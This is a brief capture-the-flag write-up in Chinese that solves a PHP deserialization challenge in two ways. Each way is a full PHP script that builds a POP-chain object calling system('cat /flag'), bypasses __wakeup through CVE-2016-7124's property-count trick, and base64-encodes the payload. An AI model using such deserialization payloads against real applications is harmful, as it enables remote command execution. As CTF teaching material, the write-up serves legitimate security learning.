# pop chain epic

很简单的反序列化

本题有两种做法

## 做法一

通过`epic`类调用`chain`类的`getAFKL`方法，将`pop`类中的`self::$bbb`赋值为`true`。最后用`CVE-2016-7124`绕过`__wakeup`。

```php
<?php
class pop
{
	public $aaa;
	
	public function __construct()
	{
		$this->aaa = [
			1=>"system",
			2=>"cat /flag",
			"object"=>[(new epic()), "getAFKL"]
		];
	}
}

class chain
{
    private $AFKL = true;
}

class epic extends chain
{
    public $aaa;

	public function __construct()
	{
		$this->aaa = $this;
	}
}

echo base64_encode(str_replace('O:3:"pop":1:', 'O:3:"pop":2:', serialize(new pop)));
```

## 做法二(期望解)

`php`中有很多不需要参数的内置函数会返回`true`，直接赋值就好。

```php
<?php
class pop
{
	public $aaa;
	
	public function __construct()
	{
		$this->aaa = [
			1=>"system",
			2=>"cat /flag",
			"object"=>"phpinfo"
		];
	}
}

echo base64_encode(str_replace('O:3:"pop":1:', 'O:3:"pop":2:', serialize(new pop)));
```

